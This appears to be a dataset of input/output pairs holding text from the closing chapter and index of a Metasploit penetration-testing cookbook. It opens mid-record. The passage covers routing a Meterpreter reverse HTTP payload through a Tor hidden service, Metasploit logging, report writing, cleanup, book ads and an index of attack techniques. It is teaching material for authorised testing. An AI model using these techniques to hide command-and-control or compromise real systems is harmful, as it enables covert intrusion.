(multi-instance-master).\n[ 381 ]"
  },
  {
    "input": "How to do it...",
    "output": "Best Practices Chapter 13\nTor is active, which means that it is running. Now we need to find our Tor hidden service\nhostname, so we can cat the hostname file located in\nthe /var/lib/tor/hidden_service/hostname directory.\nroot@kali:~# cat /var/lib/tor/hidden_service/hostname\nc2iznz6zbpptqrvt.onion\nroot@kali:~#\nHow to do it...\nNow that we have Tor configured and running, we can create a payload using msfvenom\nwith which we can compromise our target.\n1. For our payload to use Tor2web, we need to set LHOST to the onion address\nand append .link to it:\n2. Next, we need to create a listener using the Generic Payload Handler exploit\nmodule, with windows/meterpreter_reverse_http for the payload, LHOST\nfor our local IP address, and 9999 for LPORT:\n[ 382 ]"
  },
  {
    "input": "How to do it...",
    "output": "Best Practices Chapter 13\n3. Now we just need to copy the payload to the target machine and execute it. After\na couple of seconds, you should see a new Meterpreter session.\nUsing Tor can be extremely slow, and your session may timeout, which means that you\nshould play around with the timeout values and see what works for your connection.\nMetasploit logging\nLogging can be very important when processing a large number of sessions and helpful\nwhen you are writing the penetration testing report and forgot to take notes while\nperforming the test.\nHow to do it...\nWe can find the available logging options using the show options command in\nmsfconsole.\n[ 383 ]\nBest Practices Chapter 13\n1. To enable all console input and output, we need to set the ConsoleLogging\noption to true:\nmsf > set ConsoleLogging true\nConsole logging is now enabled.\nConsoleLogging => true\nmsf >\n2. Now every command typed will be logged in a file named console.log in\nthe ~/.msf4/logs directory:\n[ 384 ]\nBest Practices Chapter 13\n3. Note that, when we interacted with a session, we neither saw the commands nor\nthe output typed in the session. To enable session logging, we need to set the\nSessionLogging option to true:\nmsf > set SessionLogging true\nSession logging will be enabled for future sessions.\nSessionLogging => true\nmsf >\n4. Each session log is saved in the ~/.msf4/logs/sessions directory:\nWhen trying to troubleshoot a problem in a module or when trying to figure out why an\nexploit is not working, you may need to raise the verbosity of Metasploit logs, which can be\ndone by changing the LogLevel option from 0, the default up to 3, the most verbose\noption. All the logs are saved in the ~/.msf4/logs/ directory.\n[ 385 ]"
  },
  {
    "input": "Documentation",
    "output": "Best Practices Chapter 13\nThere's more...\nTo avoid having to set all the options every single time you launch Metasploit, or worse\nwhen you forget to set the options during a penetration test, you can use the makerc\ncommand to create a resource file and save it as msfconsole.rc in the ~/.msf4/\ndirectory; this way, msfconsole will load the options on launch.\nAs you can see in the following screenshot, whenever we launch msfconsole, it will load\nthe resource file. This way, you do not need to worry about the logs every time you start an\nengagement.\nDocumentation\nWriting the final report is the most important phase of a penetration test, given that it is\nwhat your client is paying you for; penetration testers often forget that. Your client is not\npaying you to hack their organization and pwn as many machines as you can; they are\npaying you to help them to determine their security level, identify high-risk findings, and\nprioritize fixes.\n[ 386 ]"
  },
  {
    "input": "How to do it...",
    "output": "Best Practices Chapter 13\nHow to do it...\nAlthough report generation is only available on paid versions of Metasploit, we can still\ntake advantage of the exploit capabilities of the Metasploit Framework to help us in the\nreport phase.\n1. We can export host and services information to a comma-separated values (CSV)\nfile by using the -o option, which we can then use with our favorite reporting\ntool:\n2. Using workspaces allows us to stay organized during a penetration test but also\nto access data later, thus providing easy-to-access collected data when writing the\nreport. Also, do not forget that some modules and Meterpreter scripts may store\nthe results in files; take for example the winenum Meterpret script, which saves\nthe general report and the individual command output in the\n/root/.msf4/logs/scripts/ directory:\n[ 387 ]"
  },
  {
    "input": "How to do it...",
    "output": "Best Practices Chapter 13\n3. To view the details stored in the general report, you can simply cat its contents:\nCleaning up\nThe final stage in every penetration test is cleaning up all that has been done during the\ntesting process. For this reason, during a penetration test, you must keep track of all the\npayloads you may have dropped to disk and which modules you may need to clean up\nafter you have run them.\nHow to do it...\nTake, for example, the Windows Manage Enable Remote Desktop post exploitation module;\nthis module enables Remote Desktop Service (RDP), and as you can see from the\nfollowing screenshot, it provides a Meterpreter resource file to revert the changes made to\nthe target system.\n[ 388 ]\nBest Practices Chapter 13\nAfter we have used RDP to access the target, collected evidence, or possible pivot to other\ntargets, we should use the Meterpreter resource file to revert the target to the state in which\nwe initially encountered it. The last thing we want is for our client to get compromised\nbecause we did a sloppy job and forgot to clean up after we finished the test.\n[ 389 ]"
  },
  {
    "input": "Other Books You May Enjoy",
    "output": "Other Books You May Enjoy\nIf you enjoyed this book, you may be interested in these other books by Packt:\nMastering Metaspolit - Second Edition\nNipun Jaswal\nISBN: 978-1-78646-316-6\nDevelop advanced and sophisticated auxiliary modules\nPort exploits from PERL, Python, and many more programming languages\nTest services such as databases, SCADA, and many more\nAttack the client side with highly advanced techniques\nTest mobile and tablet devices with Metasploit\nPerform social engineering with Metasploit\nSimulate attacks on web servers and systems with Armitage GUI\nScript attacks in Armitage using CORTANA scripting\nOther Books You May Enjoy\nMetasploit Bootcamp\nNipun Jaswal\nISBN: 978-1-78829-713-4\nGet hands-on knowledge of Metasploit\nPerform penetration testing on services like Databases, VOIP and much more\nUnderstand how to Customize Metasploit modules and modify existing exploits\nWrite simple yet powerful Metasploit automation scripts\nExplore steps involved in post-exploitation on Android and mobile platforms\n[ 391 ]\nOther Books You May Enjoy\nLeave a review - let other readers know what\nyou think\nPlease share your thoughts on this book with others by leaving a review on the site that you\nbought it from. If you purchased the book from Amazon, please leave us an honest review\non this book's Amazon page. This is vital so that other potential readers can see and use\nyour unbiased opinion to make purchasing decisions, we can understand what our\ncustomers think about our products, and our authors can see your feedback on the title that\nthey have worked with Packt to create. It will only take a few minutes of your time, but is\nvaluable to other potential customers, our authors, and Packt. Thank you!\n[ 392 ]"
  },
  {
    "input": "Index",
    "output": "Index\nA C\naccess point (AP) 344 Cactus WHID\nactive information gathering URL 270\nabout 39 Censys Search\nTCP Port Scanner 48 about 44\nTCP SYN Port Scanner 49 URL 44\nwith Metasploit 47 cloud penetration testing lab\nAddress Resolution Protocol (ARP) messages 351 setting up 376\nAmazon Web Services (AWS) 377 setting up, with Hack The Box 377\nAndroid backdoor cloud\ncreating 281, 282, 283, 284, 285, 286 Metasploit, deploying 360, 362, 363, 364, 365\ncreating, with msfvenom 287 Metasploit, deploying with Microsoft Azure 366,\nAndroid-x86 367, 368, 369\nURL 282 phishing 371, 372, 373, 374, 375, 376\nantivirus comma-separated values (CSV) file 387\nbypassing 264 Common Vulnerabilities and Exposures (CVE) 92\nARP Sweep CorpWatch Company Name Information Search 42\nhost discovery 57 CPE WAN Management Protocol (CWMP) 316\nATutor credential harvesting 224\nURL 98 custom auxiliary module\nautoroute 228 building 316, 317, 320\nAutoRunScript custom post-exploitation module\nautomation with 156, 157 building 312, 313, 314, 316\nauxiliary modules\nD\ncustom auxiliary module, building 316, 317, 320\nlisting 302 database\nusing 301, 303 using 30, 31\ndb_nmap\nB\nNmap Scripting Engine (NSE) 56\nbackdoors used, for port scanning 55\ninstalling 114, 117, 119 Debian package 278\npersistence, setting up 208 Denial of Service (DoS) 119, 122\nBetterCAP DNS Record Scanner and Enumerator auxiliary\nusing 350 module 41, 42\nbind 100 documentation 386, 388\nbrute forcing 72 Doppelganger Domains 40\nDoS attack modules fuzzer\nabout 304, 307 writing 336, 337, 339\nHTTP 304 fuzzing\nSMB 305 about 334\nDynamic Data Exchange (DDE) 268 with Metasploit 334, 335\nE G\negghunter 330 gateway 133\nencoders getdesktop\nabout 244 sniffing 148, 150\nusing 245, 246, 247, 249, 250 Golden Tickets 208\nencrypted LVM Gophish\nKali Linux, partitioning with 380 about 372\nenumeration modules 225, 228 reference 375\nevil twin attack URL 372\nabout 344\nH\nsetting up 344, 346\nexecutables Hack The Box\nbackdooring, with man-in-the-middle (MITM) about 377\nattack 273, 274, 275, 276, 277 URL 377\nexisting module used, for setting up cloud penetration testing lab\nanalyzing 311, 312 377\nExploit Database host discovery\nURL 326 with ARP Sweep 57\nexploit mixins hosts command\nabout 322 using 32, 34\nExploit**BruteTargets 322 HTA attack\nExploit**Remote**Ftp 322 about 271\nExploit**Remote**SMB 322 implementing 272, 273\nExploit**Remote**TCP 322 HTML Application (HTA) 350\nExploit**Remote**UDP 322 HTTP fuzzer\nMsf**Exploit**Egghunter 323 using 334\nMsf**Exploit**Seh 323 Human Interface Device (HID) attacks\nexploit module about 269\nporting 332, 333 implementing 270, 271\ntesting 332, 333 Hypertext Transfer Protocol (HTTP)\nexploit scanning 69, 72\nabout 8\nI\nconverting, to Metasploit module 329, 330, 331\nF IDS/IPS\nbypassing 264\nframework plugins impersonation 192\nloading 169, 171, 172 incognito attacks\nFTP scanning 65 with Meterpreter 201, 203\n[ 394 ]\ninfectious media generator M\nabout 299\nusing 300 macOS\ninformation gathering installing 11, 12\nactive information gathering 39 Metasploit, installing 13, 14\npassive information gathering 39 man-in-the-middle (MITM) attack\nsocial engineering 40 used, for backdooring executables 273, 274,\nInfrastructure as a Service (IaaS) 360 275, 276, 277\nInternet of Things (IoT) 69 Management Information Base (MIB) 68\nIntrusion Detection System (IDS) 52, 244 Mandatory Integrity Control (MIC) 193\nmass email attack 291\nK Metasploit 2 machine\nURL 19\nKali Linux\nMetasploit Anti-Forensic Investigation Arsenal\nconnecting, with SSH 24\n(MAFIA) 148\ndownloading 378, 379\nMetasploit Framework 8\nMetasploit, using 14, 17\nMetasploit macro exploit\npartitioning, with encrypted LVM 380\nimplementing 266, 267, 269\nupgrading 17\nMetasploit module\nURL 15, 19\nexploit, converting to 329, 330, 331\nKarmetasploit\nMetasploit PHP Hop\nabout 346\nabout 370\nconfiguring 346, 347, 348, 349\nusing 370\nkeystroke\nMetasploit\nsniffing 148, 150\ncommunity edition 10\nL deploying, in cloud 360, 362, 363, 364, 365\ndeploying, in cloud with Microsoft Azure 366,\nLink-Local Multicast Name Resolution (LLMNR)\n367, 368, 369\n357\nexpress edition 10\nLinux server\nframework edition 10\nexploiting 91, 93, 96\nfuzzing with 334, 335\npayload 96, 97\ninstalling, on macOS 13, 14\nLinux trojan\ninstalling, on Windows 10\ncreating 278, 279\nlogging 383, 384, 385\nLinux Unified Key Setup (LUKS) 380\npro edition 10\nLinux\nURL 10, 371\ninstalling 11, 12\nusing, in Kali Linux 14, 17\nLocal Security Authority Subsystem Service\nusing, over Tor 380, 381, 382, 383\n(LSASS) 205\nwireless penetration test, performing 341, 342,\nlogging\n343\nabout 383, 384, 385\nMeterpreter anti-forensics 145, 147, 148\nmsfconsole, launching 386\nMeterpreter API 173, 175\nLogical Volume Management (LVM) 380\nMeterpreter certificates\ncreating, with trusted certificates 257\nMeterpreter payloads\n[ 395 ]\ncreating, with trusted certificates 256, 258, 259 N\nMeterpreter\nabout 124 named pipe 192\ncore commands 125, 128, 130 National Security Agency (NSA) 112\nfilesystem commands 130, 132 Nessus Home\nincognito attacks 201, 203 URL 74\nnetworking commands 133, 137 Nessus\npivoting 215, 217, 220 integrating with 73, 79\nport forwarding 221, 223 NetBIOS Session Service (NBSS) 121, 305\nresource scripts 158 netmask 133\nsystem commands 138, 142 Network Address Translation (NAT) 19\ntimeout control 160 NeXpose\ntransports 162 integrating with 80, 82\nMicrosoft Azure URL 80\nURL 366 Nmap Scripting Engine (NSE) 56\nMimikatz Nmap\nabout 208 about 50\nusing 203, 208 anonymity, increasing 55\nmixins 173, 175 operating system 53\nModified-Accessed-Created-Entry (MACE) 145 used, in port scanning 53\nmodule structure version detection 53\nexploiting 323, 324, 325\nO\nmodules\nabout 8 Open Vulnerability Assessment System (OpenVAS)\nbuilding 309 integrating with 82, 85, 87\nexisting module, analyzing 311, 312 operating system identification 53\nMozilla Firefox 41.0 output formats 250, 252\nURL 262\nP\nMS17-010 EternalBlue SMB Remote Windows\nKernel Pool Corruption 111, 112 pass the hash technique 200\nMS17-010 passive information gathering 39\nEternalRomance/EternalSynergy/EternalChamp Censys Search 44\n113 CorpWatch Company Name Information Search\nMSFconsole 42\nabout 90 DNS Record Scanner and Enumerator auxiliary\ncommands 90 module 41, 42\nMSFvenom Search Engine Domain Email Address Collector\nused, for generating shellcode 326, 327, 328, 46\n329 Search Engine Subdomains Collector 43\nmulti-attack web method Shodan Honeyscore Client 46\nabout 298 Shodan Search 45\nusing 299 with Metasploit 40\nmultiple communication channels payload\nsetting up, with target 142, 145 about 8, 238\noptions 238, 239, 240, 243\n[ 396 ]\npenetration test Remote Desktop\ncleaning up 388, 389 enabling 182, 185\npenetration-testing lab Remote Frame Buffer (RFB) 180\nsetting up 18, 22, 23 Remote Procedure Call (RPC) 275\npersistence reset connection (RST) 53\nsetting up, with backdoors 208 reverse 100\nphishing Ruby extension (Rex) 9\nfrom cloud 371, 373, 374, 375, 376\nS\npivoting\nwith Meterpreter 215, 217, 220 scraper Meterpreter script\nPlatform as a Service (PaaS) 360 using 153, 155\nport forwarding Search Engine Domain Email Address Collector 46\nwith Meterpreter 221, 223 Search Engine Subdomains Collector 43\npost-exploitation module, category Secure Shell (SSH)\ncapture 313 connectivity, setting up 23, 24\nescalate 313 used, for connecting to Kali Linux 24\ngather 313 Security Accounts Manager (SAM)\ngather/credentials 313 contents, dumping 198, 200\ngather/forensics 313 Server Message Block (SMB)\nmanage 313 about 60, 120\nrecon 313 enumeration 60, 63\nwlan 313 scanning 60, 63\npost-exploitation modules services command 34, 35, 37\nabout 188, 190, 193, 307 services\nanalyzing 231, 233 exploiting 110, 111\ncustom post-exploitation module, building 312, shellcode\n313, 314, 316 generating, with MSFvenom 326, 327, 328, 329\nusing 308 shells\nwriting 234, 235 types 100, 102, 103\nPostgreSQL Shodan Honeyscore Client 46\nconfiguring 26, 29 Shodan Search\nprocess ID (PID) 151 about 45\nproof of concept (PoC) URL 45\nusing 321 Simple Mail Transfer Protocol (SMTP)\nprovider 360 enumeration 66, 67\nSimple Network Management Protocol (SNMP)\nR\nenumeration 67\nRailgun Simple Object Access Protocol (SOAP) 72\nabout 175, 177 SMB relay attacks\nDLL, adding 177, 180 about 353\nfunction definition, adding 177, 180 setting up 353, 354, 355, 356, 357, 358\nURL 177 SMBLoris 120, 305\nregistry social engineering 40\ninteracting with 165, 168 Social-Engineer Toolkit (SET)\nRemote Desktop Service (RDP) 388 about 288\n[ 397 ]\ninstalling 288 user interface (UI) 9\nlaunching 289, 290\nV\nURL 289\nsocks proxy server 228 version detection 54\nSoftware as a Service (SaaS) 360 Virtual Network Computing (VNC)\nspear-phishing attack vector injecting remotely 180\nabout 290 virtual networks\nimplementing 291, 292, 293 reference 377\nSQL injection 98, 100 vulnerability 8\nSSH versions vulnerable machines\ndetecting, with scanner 63 URL 377\nStructured Exception Handler (SEH) 330\nsubnet 133 W\nT website attack vectors\nabout 294\nTCP Port Scanner 48 using 295, 296, 297\nTeensy USB HID Windows 10 machine\nURL 270 exploiting 262\ntemplates Windows binaries\nabout 254 backdooring 212, 214\nusing 254, 255 Windows Local Enumeration (WinEnum)\ntenants 360 used, for system scraping 155\nTor Windows Management Instrumentation (WMI) 114\nabout 380 Windows Remote Management (WinRM)\nMetasploit, using over 380, 381, 382, 383 scanning 72\ntrusted certificates Windows Server machine\nused, for creating Meterpreter payloads 256, exploiting 104, 105, 107, 108, 110\n257, 258, 259 Windows\nTrustedInstaller 210, 212 Metasploit, installing 10\nType-Length-Value (TLV) 142 wireless MITM attacks\nabout 349\nU\nsetting up 350, 351, 352\nUDP Service Sweeper 59 wireless penetration test\nUser Account Control (UAC) performing, with Metasploit 341, 342, 343\nbypassing 193, 196, 197 workspaces\ncreating 29, 30"
  }
]